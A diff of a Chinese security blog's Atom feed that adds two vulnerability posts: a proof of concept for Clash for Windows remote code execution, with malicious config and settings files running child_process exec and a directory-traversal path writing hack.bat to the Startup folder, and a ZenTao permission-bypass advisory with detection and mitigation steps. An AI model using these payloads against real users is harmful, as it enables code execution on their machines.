@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-01-13T09:27:51.470Z</updated>
+  <updated>2023-01-18T03:22:46.690Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,50 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>clash最新远程代码执行漏洞</title>
+    <link href="http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
+    <published>2023-01-18T03:19:36.000Z</published>
+    <updated>2023-01-18T03:22:46.690Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p><strong>漏洞概述</strong></p><p>clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配置和控制 Clash 核心程序，便于用户可视化操作和使用。</p><p><strong>下载链接：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Fndroid/clash_for_windows_pkg/releases</span><br></pre></td></tr></table></figure><p>目前最新版本为V 0.20.12。</p><p>Windows 上的 clash_for_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js代码将会被执行。</p><p><strong>影响版本版本：</strong>&lt; V 0.20.12V</p><p><strong>操作系统：</strong>Windows x64</p><p><strong>系统版本：</strong>Windows 11</p><p><strong>风险等级：</strong>高危</p><p><strong>漏洞复现</strong></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ol><li><p>The attacker starts a web service to ensure that these two files can be accessed:</p><p>启动一个web服务来确保这两个文件可以被访问</p></li></ol><p>config.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">port: 7890</span><br><span class="line">socks-port: 7891</span><br><span class="line">allow-lan: true</span><br><span class="line">mode: Rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: :9090</span><br><span class="line">proxies:</span><br><span class="line">  - name: a</span><br><span class="line">    type: socks5</span><br><span class="line">    server: 127.0.0.1</span><br><span class="line">    port: &quot;17938&quot;</span><br><span class="line">    skip-cert-verify: true</span><br><span class="line"></span><br><span class="line">rule-providers:</span><br><span class="line">  p:</span><br><span class="line">    type: http</span><br><span class="line">    behavior: domain</span><br><span class="line">    url: &quot;http://this.your.url/cfw-settings.yaml&quot;</span><br><span class="line">    path: ./cfw-settings.yaml</span><br><span class="line">    interval: 86400</span><br></pre></td></tr></table></figure><p>cfw-settings.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload:</span><br><span class="line">  - DOMAIN-SUFFIX,acl4.ssr,全球直连</span><br><span class="line">showNewVersionIcon: true</span><br><span class="line">hideAfterStartup: false</span><br><span class="line">randomControllerPort: true</span><br><span class="line">runTimeFormat: &quot;hh : mm : ss&quot;</span><br><span class="line">trayOrders:</span><br><span class="line">  - - icon</span><br><span class="line">  - - status</span><br><span class="line">    - traffic</span><br><span class="line">    - text</span><br><span class="line">hideTrayIcon: false</span><br><span class="line">connShowProcess: true</span><br><span class="line">showTrayProxyDelayIndicator: true</span><br><span class="line">profileParsersText: &gt;-</span><br><span class="line">  parsers:</span><br><span class="line">    - reg: .*</span><br><span class="line">      code: </span><br><span class="line">        module.exports.parse = async (raw, &#123; axios, yaml, notify, console &#125;, &#123; name, url, interval, selected &#125;) =&gt; &#123;</span><br><span class="line">          require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);</span><br><span class="line">          return raw;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><ol><li><p>Victim uses subscription link </p><p>使用订阅链接</p></li><li><p>restart the clash_for_windows_pkg</p><p>重新启动</p></li><li><p>Update subscriptions or import new subscriptions</p><p>更新订阅或导入新订阅</p></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTmXBvXrlIrNyUjyw3h1tDJjkp11P8pibSY3JJtc4ukWXhFKjr1fVFqqtTO6icZAzAUich5NqMb1TtcCw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><blockquote><p>No response</p></blockquote><h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><p>由于是rule-providers的自定义path的问题，还有其他利用方式，比如用目录穿越写入开机启动项<br>path: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.bat<br>不过杀毒软件会弹框</p><p>Since it is a problem with the custom path of rule-providers, there are other ways to use it, such as using directory traversal to write into the startup item<br>path: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.bat<br>But the antivirus software will warn.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?w</summary>
+      
+    
+    
+    
+    <category term="漏洞" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>禅道系统权限绕过与命令执行漏洞（附POC）~</title>
+    <link href="http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/"/>
+    <id>http://example.com/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/</id>
+    <published>2023-01-17T23:24:01.000Z</published>
+    <updated>2023-01-18T03:31:08.547Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程，也是国内最流行的项目管理软件。</p><p><strong>官方链接：</strong></p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zentao.net/index.html</span><br></pre></td></tr></table></figure><p>该系统在2023年初被爆出在野命令执行漏洞，官方已于2023年1月12日发布了漏洞修复补丁。该漏洞是由于禅道项目管理系统权限认证存在缺陷导致，攻击者可利用该漏洞在未授权的情况下，通过权限绕过在服务器执行任意命令。</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20230118112816475.png" alt="image-20230118112816475"></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h2><table><thead><tr><th><strong>禅道系统</strong></th><th><strong>影响版本</strong></th></tr></thead><tbody><tr><td>开源版</td><td>17.4以下的未知版本&lt;=version&lt;=18.0.beta1</td></tr><tr><td>旗舰版</td><td>3.4以下的未知版本&lt;=version&lt;=4.0.beta1</td></tr><tr><td>企业版</td><td>7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta</td></tr></tbody></table><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a><strong>漏洞说明</strong></h2><p><strong>漏洞类型：</strong>命令执行、权限绕过</p><p><strong>漏洞危害：</strong>攻击者利用此漏洞可实现任意执行命令</p><p><strong>漏洞编号：</strong>CVE暂无，<strong>其他编号</strong>QVD-2023-1953</p><p>**<em>*CVSS 3.1*</em>**评级：****9.8分</p><p><strong>风险等级：</strong>高危</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>奇安信CERT：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTmXBvXrlIrNyUjyw3h1tDJj7HxtyU0JCHsatboPhNf8YQ0xxPmQ8vfqTIs59YEU5R0mz9viciaUhrmA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1" alt="图片"></p><p>烽火台实验室：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxeLEwohtsU3f11iaibgYxzeFoXHABGBF5MoSOCPgQgqrkX4SRHEQIdsyA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p><strong>漏洞检测</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p>以开源版禅道为例：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQHvgS3brIqlKvJSJQpwmmiaxxqzaUHIPeW87Pk50Uia7M15icr4ayicTt6qw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p><p>可以在不登录的情况下查看网页源代码：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQHtDNRYL97YVnU7IljxvNLCqeP2KEicRlUPFUMl8XPXlXD4ibfuOGicbxNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p><p>若已登录，也可以在右下角查看禅道版本：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQH5dhRzFZyojb16T8ZicTsJSJWTicNj8HBdHYuHYEr1vMslbmSEWjJvQqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic&retryload=1" alt="图片"></p><p>若版本在影响范围内，则系统有可能受该漏洞影响。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p><strong>攻击排查</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p>1、以Windows举例，用户可通过排查系统中日志是否存在以下内容，若存在，则说明系统可能遭受到攻击：</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc-captcha-user.html</span><br></pre></td></tr></table></figure><p>2、攻击者可能会使用一个空白用户名来创建一个代码库名为12346的操作，如下图所示，若存在该操作，则系统可能遭到攻击。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VvfsuOanecp4xynI9oIibOsbrEz0EiarQH6iavjk4YQ5ib0Oo6uOTYD0TUvuEYMlnIviafEhYrSEr3XkaoG9AxrrFGA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic" alt="图片"></p><h2 id="加固措施"><a href="#加固措施" class="headerlink" title="加固措施"></a><strong>加固措施</strong></h2><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p><p><strong>1、进行官方升级:</strong></p><p>具体升级方法</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zentao.net/book/zentaoprohelp/41.html</span><br></pre></td></tr></table></figure><p><strong>2、安全产品升级:</strong></p><p>部分厂商安全产品具备识别该漏洞功能，进行版本升级至最新版。</p><p><strong>3、临时防护措施：</strong></p><p>可在module/common/model.php文件中 echo $endResponseException-&gt;getContent();后面加上exit(); 来修复权限绕过漏洞。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;禅道是一款国产的开源项目管理软件。它集产品管理、项目管理、质量管理、文档管理、组织管理和事</summary>
+      
+    
+    
+    
+    <category term="漏洞" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>个人渗透测试常用方法总结</title>
@@ -445,28 +489,6 @@
     
     
     <category term="sql 注入" scheme="http://example.com/tags/sql-%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>hello-world</title>
-    <link href="http://example.com/2021/05/02/my-first-blog/"/>
-    <id>http://example.com/2021/05/02/my-first-blog/</id>
-    <published>2021-05-02T09:30:00.000Z</published>
-    <updated>2021-08-05T07:43:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。</p><div class="alert alert-success"><p>成功啦o(<em>￣▽￣</em>)ブ</p></div><div class="alert alert-danger"><p>有危险Σ(っ °Д °;)っ</p></div><div class="alert alert-info"><p>有消息(・∀・(・∀・(・∀・*)</p></div><div class="alert alert-warning"><p>当心哦≧ ﹏ ≦</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% alertbox success &quot;成功啦o(*￣▽￣*)ブ&quot; %&#125;</span><br><span class="line">&#123;% alertbox danger &quot;有危险Σ(っ °Д °;)っ&quot; %&#125;</span><br><span class="line">&#123;% alertbox info &quot;有消息(・∀・(・∀・(・∀・*)&quot; %&#125;</span><br><span class="line">&#123;% alertbox warning &quot;当心哦≧ ﹏ ≦&quot; %&#125;</span><br></pre></td></tr></table></figure><div class="xControl">    <div class="xHeading"><div class="xIcon"><i class="fa fa-plus"></i></div><span>折叠框的标题</span></div>    <div class="xContent"><div class="inner">        <p>被折叠的内容 1<br>被折叠的内容 2<br>…</p>     </div></div>    </div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% collapse 折叠框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">被折叠的内容 1</span><br><span class="line">被折叠的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcollapse %&#125;</span><br></pre></td></tr></table></figure><p>TYPE是面板框的类型，可以是：</p><p>successs<br>danger<br>info<br>warning</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% colorpanel TYPE 面板框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">面板里的内容 1</span><br><span class="line">面板里的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcolorpanel %&#125;</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装</summary>
-      
-    
-    
-    
-    <category term="日常" scheme="http://example.com/categories/%E6%97%A5%E5%B8%B8/"/>
-    
     
   </entry>
   
